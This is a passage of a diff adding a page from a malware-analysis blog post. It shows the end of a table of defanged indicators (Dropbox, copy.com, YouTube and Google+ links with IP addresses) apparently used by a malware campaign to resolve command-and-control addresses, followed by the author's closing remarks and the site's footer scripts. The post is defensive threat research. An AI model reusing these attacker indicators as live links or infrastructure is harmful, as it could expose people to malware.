+<td>hxxps://dl[.]dropboxusercontent[.]com/s/7ttsyz4ypnco0sd/file[.]html</td>
+<td>19907899063843</td>
+<td>14889976862</td>
+<td>119[.]131[.]4[.]30</td>
+</tr>
+<tr>
+<td>hxxp://www[.]youtube[.]com/watch?v=EsVgsH-NfD0b</td>
+<td>49741276945318</td>
+<td>37203647678</td>
+<td>169[.]130[.]156[.]190</td>
+</tr>
+<tr>
+<td>hxxp://www[.]youtube[.]com/watch?v=8Sxcin85wxQ</td>
+<td>19907899063843</td>
+<td>14889976862</td>
+<td>119[.]131[.]4[.]30</td>
+</tr>
+<tr>
+<td>hxxps://plus[.]google[.]com/109526023785415750407/posts/1ecFp1jLnX1</td>
+<td>N/A</td>
+<td>N/A</td>
+<td>N/A</td>
+</tr>
+<tr>
+<td>hxxps://plus[.]google[.]com/108098760042015113400/posts?hl=en</td>
+<td>N/A</td>
+<td>N/A</td>
+<td>N/A</td>
+</tr>
+<tr>
+<td>hxxps://plus[.]google[.]com/105611301541879878976/posts/fCo9jvzZKNT</td>
+<td>N/A</td>
+<td>N/A</td>
+<td>N/A</td>
+</tr>
+<tr>
+<td>hxxps://copy[.]com/hSn32C8TeJKq/file[.]html</td>
+<td>N/A</td>
+<td>N/A</td>
+<td>N/A</td>
+</tr>
+</tbody>
+</table>
+<h2 id="whaddya-gonna-do">Whaddya Gonna Do?</h2>
+<p>There is a lot to this campaign, both malware analysis and questions. The files also contain DLLs, decoy documents, more VBE scripts, and C2 commands. This all could be analysed along with the identified infrastructure and their own associated links. Given the videos were created so long ago, I have to question if the C2s are still active; however, that beggers the question who is and why are these samples being uploaded now? While the C2 channel would resolve to a raw IP address (which may stand out in certain environments) it does allow an adversary to quickly change the C2 IP without having to update the malware itself.</p>
+<p>Social media are well recorded as being used by actors for various means, this is just another example I hope people find interesting. If you do any follow-up or have any thoughts, questions for comments, please drop me a note at <a href="mailto:matt@bitofhex.com">matt@bitofhex.com</a> or at <a href="https://twitter.com/mattnotmax">@mattnotmax</a>. Thanks for reading!</p>
+
+    </div>
+    <div class="article-footer">
+    </div>
+  </article>
+
+</div><nav class="bar bar-footer clearfix" data-stick-bottom>
+    <div class="bar-inner">
+        <ul class="pager pull-left">
+            <li class="prev">
+                <a href="https://bitofhex.com/2020/04/18/forensic-freebie/" title="Forensic Freebie with digitalforensics.io"><i
+                        class="icon icon-angle-left"
+                        aria-hidden="true"></i><span>&nbsp;&nbsp;Older</span></a>
+            </li>
+            
+            <li class="toggle-toc">
+                <a class="toggle-btn collapsed" data-toggle="collapse" href="#collapseToc" aria-expanded="false"
+                    title="Catalogue" role="button">
+                    <span>[&nbsp;</span><span>Catalogue</span>
+                    <i class="text-collapsed icon icon-anchor"></i>
+                    <i class="text-in icon icon-close"></i>
+                    <span>]</span>
+                </a>
+            </li>
+        </ul>
+        <div class="bar-right">
+            <div class="share-component" data-sites="facebook,twitter,linkedin,google"
+                data-mobile-sites="facebook,twitter,linkedin,google"></div>
+        </div>
+    </div>
+</nav>
+
+</main><footer class="footer" itemscope itemtype="http://schema.org/WPFooter">
+<ul class="social-links">
+    <li><a href="https://github.com/mattnotmax" target="_blank" title="github" data-toggle=tooltip data-placement=top >
+            <i class="icon icon-github"></i></a></li>
+    <li><a href="https://bitofhex.com/index.xml" target="_blank" title="rss" data-toggle=tooltip data-placement=top >
+            <i class="icon icon-rss"></i></a></li>
+    <li><a href="https://twitter.com/mattnotmax" target="_blank" title="twitter" data-toggle=tooltip data-placement=top >
+            <i class="icon icon-twitter"></i></a></li>
+</ul>
+  <div class="copyright">
+    &copy;2018  -
+    2020
+    <div class="publishby">
+        Theme by <a href="https://github.com/xiaoheiAh" target="_blank"> xiaoheiAh </a>base on<a href="https://github.com/xiaoheiAh/hugo-theme-pure" target="_blank"> pure</a>.
+    </div>
+  </div>
+</footer>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/MathJax.js?config=TeX-MML-AM_SVG"></script>
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+            showMathMenu: false, //disables context menu
+            tex2jax: {
+            inlineMath: [ ['$','$'], ['\\(','\\)'] ]
+           }
+    });
+</script>
+
+
+<script src="https://cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js"></script>
+<script>
+    window.jQuery || document.write('<script src="js/jquery.min.js"><\/script>')
+</script>
+<script type="text/javascript" src="https://cdn.staticfile.org/highlight.js/9.15.10/highlight.min.js"></script>
+<script type="text/javascript" src="https://cdn.staticfile.org/highlight.js/9.15.10/languages/python.min.js" defer></script>
+<script type="text/javascript" src="https://cdn.staticfile.org/highlight.js/9.15.10/languages/javascript.min.js" defer></script>
+<script type="text/javascript" src="https://cdn.staticfile.org/highlight.js/9.15.10/languages/powershell.min.js" defer></script><script>
+    hljs.configure({
+        tabReplace: '    ', 
+        classPrefix: ''     
+        
+    })
+    hljs.initHighlightingOnLoad();
+</script>
+<script src="https://bitofhex.com/js/application.min.bdeb64b910570b6c41badc6a05b7afb0c8ad9efd8525de3c7257d59e786326a3.js"></script>
+<script src="https://bitofhex.com/js/plugin.min.51ff8c7317566f82259170fa36e09c4493adc9b9378b427a01ad3f017ebac7dd.js"></script>
+
+<script>
+    (function (window) {
+        var INSIGHT_CONFIG = {
+            TRANSLATION: {
+                POSTS: 'Posts',
+                PAGES: 'Pages',
+                CATEGORIES: 'Categories',
+                TAGS: 'Tags',
+                UNTITLED: '(Untitled)',
+            },
+            ROOT_URL: 'https:\/\/bitofhex.com\/',
+            CONTENT_URL: 'https:\/\/bitofhex.com\/\/searchindex.json ',
+        };
+        window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+    })(window);
+</script>
+<script type="text/javascript" src="https://bitofhex.com/js/insight.min.a343cd9a5a7698336b28ef3a7c16a3a1b1d2d5fb17dc8ed04022bbe08cc5459073a15bdafa3a8a58cdd56080784bdd69fa70b1ae8597565c799c57ed00f0e120.js" defer></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+<script>
+    tocbot.init({
+        
+        tocSelector: '.js-toc',
+        
+        contentSelector: '.js-toc-content',
+        
+        headingSelector: 'h1, h2, h3',
+        
+        hasInnerContainers: true,
+    });
+</script>
+
+
+  </body>
+</html>
